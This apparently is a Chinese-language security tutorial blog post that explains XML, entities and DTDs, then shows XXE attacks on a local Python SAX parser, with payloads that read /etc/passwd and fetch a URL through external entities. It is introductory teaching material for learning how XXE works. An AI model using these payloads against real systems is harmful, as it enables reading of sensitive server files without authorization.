# 什么是XML
extensible markup language(XML)类似于HTML的可扩展的标记语言，但主要区别在于，HTML是关于数据表示的，但是XML是关于数据传输的，XML是可读的，他被用在很多地方，比如API，UI布局，android应用程序配置文件，RSS等
这是一个XML文档的例子
```
<?xml version='1.0'>      //指定xml元数据，在这种情况下，xml解析器在处理时将使用的版本为1.0
<Person>        //这个标签存放的是根文档的元素
	<Name>BaiMao</Name>   //嵌套标签name
	<Age>17</Age>      //嵌套标签age
</Person>
```
XML文档有一些语法规则，比如说标签名称的大小写，这意味着开始和结束标签名称必须完全相同，还有某些字符，如<>' "
```
<?xml version='1.0'>
<Person>
	<Name>BaiMao</Name>
	<Age>17<>' "</Age>           //错误的使用方法
</Person>
```
这些符号不能直接在xml文档中，因为解析器会很难理解输入的是否是值的一部分或者只是一个标签
解决办法是一种被称为实体的东西
# 实体
实体是简单的存储单元，可以将他们视为xml的变量，可以为它赋予一个值，然后在xml文档里不同地方多次使用，但在xml文档中单独部分里被定义，被称为文档类型定义简称为DTD
示例：
```
<?xml version="1.0"?>
<!DOCTYPE Person [             //在doctype中创建了一个实体，它告诉xml解析器这是一个文档类型的定义
	<!ENTITY name "baimao">    //我们在这里定义了一个存储单元，将其命名为name
	]>
<Person>
	<Name>&name;</Name>     //在这里使用了一个实体，然后在名称标签里引用了它
	<Age>17</Age>
</Person>
```
## 通用实体
如果要在多个地方使用相同的值，这种方法可以省很多时间
在xml文档中存在三种类型的实体，通用实体，参数实体和预定义实体，刚刚演示的是通用实体，在通用实体中，我们只是有一些值在某处被引用
## 参数实体
参数实体有些特殊，它们只允许在DTD中使用，并且它们更灵活，列如，创建一个值，是另一个实体的实体
```
<!ENTITY % outer "<!ENTITY inner 'baimao'>">   
```
需要用XML外部实体时非常有用
## 预定义实体
预定义实体是非常有用的实体，作用是运用一些特殊字符，如<>' "，例如，要在xml文档里使用<作为值时，如果直接输入的话，xml解析器会出错，为了解决这个问题，我们才有了预定义实体
```
<hello>H<llo</hello>     //如果直接输入的话，xml解析器会出错
<hellp>&#x3C;</hello>   //用&#x3C;代替<
```
# XML安全
从实体开始，就像我们上面提到的那些，实体可以存储值然后可以在之后使用变量，但是xml不仅仅是在实体中存储一些值然后使用他们，xml标准提供了更多的特性，外部实体就是其中之一，实体不仅可以存储指定的值，还可以从本地文件中提取值，甚至可以通过网络获取远程数据，并将他们存储在实体中，以供之后使用
我们举一个例子，来看看外部实体是如何运行的
```
<?xml version="1.0"?>
<!DOCTYPE XXE [
	<!ENTITY subscribe SYSTEM "test.txt">    //命名了一个叫subscribe的实体，system的作用是获取外部资源并将其存储在实体中
]>
<baimao>&subscribe;</baimao>    //调用了subscribe实体
```
另外，test.txt是实体的值，而不是test.txt文件，这只是从实际值中读取的文件名称
xml接受任何有效的URL，其中包括http，ftp等其他协议
![在这里插入图片描述](https://img-blog.csdnimg.cn/a376003b9323435794fe1ccb17706534.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
test.txt文件中的内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/f68ae3d4b19d4d8ab6628136d3f0edb0.png)
解析器脚本
https://engineering.purdue.edu/kak/scriptingwithobjects/swocode/chap17/XmlSaxParser.py
```
#!/usr/bin/env python

### XmlSaxParser.py

import xml.sax                                                       #(A)

#-------------------------  class MyHandlers  --------------------------
class MyHandlers( xml.sax.ContentHandler ):                          #(B)

    def startElement( self, name, attributes ):                      #(C)
        print "start tag recognized for element: " + name            #(D)
        if attributes:                                               #(E)
            print "    Attributes:"                                  #(F)
            for item in attributes.items():                          #(G)
                print "      ", item[0], " = ", item[1]              #(H)
            print                                                    #(I)
        
    def characters( self, content ):                                 #(J)
        content = content.lstrip().rstrip()                          #(K)
        if content:                                                  #(L)
            print "character handler invoked for string: ", content  #(M)

    def endElement( self, name ):                                    #(N)
        print "end tag recognized for element: " + name              #(O)
        
    def startDocument( self ):                                       #(P)
        print "document parse started"                               #(Q)

    def endDocument( self ):                                         #(R)
        print "end of document reached --- parse ended"              #(S)

    def processingInstruction( self, target, data ):                 #(T)
        print "processing instruction recognized for target ",target #(U)
        print "    processing instruction data: " + data             #(V)

#----------------------- end of MyHandlers class  ----------------------

if __name__ == '__main__':                                           #(W)

    import sys    
    if len( sys.argv ) is not 2:
        sys.exit( "need an xml file" )        
    xmldoc = sys.argv[1]                                             #(X)

    # make_parser() returns a xml.sax.XMLReader object:
    reader = xml.sax.make_parser()                                   #(Y)
    reader.setContentHandler( MyHandlers() )                         #(Z)

    print xml.sax.handler.all_features                               #(a)
    print xml.sax.handler.feature_namespaces                         #(b)
                             # http://xml.org/sax/features/namespaces
    xml.sax.handler.feature_namespaces = True                        #(c)
    print xml.sax.handler.feature_namespaces     # True              #(d)

    try:                                                             #(e)
        reader.parse( xmldoc )                                       #(f)
    except xml.sax.SAXParseException, e:                             #(g)
        print "  parsing error:    ", e.getMessage()                 #(h)
        print "  in line:          ", e.getLineNumber()              #(i)
        print "  at location:      ", e.getColumnNumber()            #(j)
        print "  exception raised: ", e.getException()               #(k)
        print "  for event ID:     ", e.getPublicId()                #(l) 
        print "  for system ID:    ", e.getSystemId()                #(m) 
        sys.exit(1)                                                  #(n)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5afa2913a3a641b98b3792b7eb4239de.png)

赋予执行权限后，使用xml解析器解析xml文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/82cae27ce0f5425894289951550aa2f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
成功的输出了text.txt里的内容
尝试读取敏感文件内容
```
<?xml version="1.0"?>
<!DOCTYPE XXE [
	<!ENTITY subscribe SYSTEM "/etc/passwd">    //命名了一个叫subscribe的实体，system的作用是获取外部资源并将其存储在实体中
]>
<baimao>&subscribe;</baimao>    //调用了subscribe实体
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cd815b11479e4e33b9fe525abbb23deb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
使用xml解析器解析xml文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/41dbe6f03da745b7afa611d15ee4469d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
成功的读取了内容
读取本地文件的这种攻击被称为xml外部实体攻击，简称为XXE
然而，读取本地文件只是开始，我们还可以将URL放入其中
```
<?xml version="1.0"?>
<!DOCTYPE XXE [
	<!ENTITY subscribe SYSTEM "http://127.0.0.1/test.txt">    //命名了一个叫subscribe的实体，system的作用是获取外部资源并将其存储在实体中
]>
<baimao>&subscribe;</baimao>    //调用了subscribe实体
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/eb0f5591f9fc4dc8a04686c899a0d0f2.png)
使用xml解析器解析xml文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/6d28d68046034dbaac42ab52ee098aaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
也成功的读取了内容
XXE也有许多不同的类型
## Inband
上面演示的实例就是关于inband的，xml被解析，直接输出到屏幕上
## Error
error有一点像一个盲目的xxe，都是一堆错误，看不到很多的信息
## OOB
最后是oob，xml被解析，但你看不到任何输出，必须做某种越界请求来泄露数据
实战在下一篇的xxe文章中会详细写道，这一篇只是简单介绍什么是xxe以及原理
